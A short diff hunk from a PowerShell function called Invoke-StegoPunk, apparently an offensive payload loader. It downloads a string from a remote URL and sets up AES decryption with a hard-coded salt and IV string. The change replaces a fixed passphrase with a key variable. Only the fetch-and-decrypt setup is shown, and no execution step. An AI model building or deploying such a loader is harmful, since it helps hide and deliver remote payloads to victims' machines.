@@ -61,7 +61,7 @@ function Invoke-StegoPunk {
           $inputstring = $request.DownloadString($b_url)
           $InputBytes = [Text.Encoding]::utf8.GetBytes($InputString)
           $AES = New-Object System.Security.Cryptography.AesManaged
-          $Passphrase="Passo"
+          $Passphrase=$key
           $salt="My Voice is my P455W0RD!"
           $init="Yet another key"
           $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
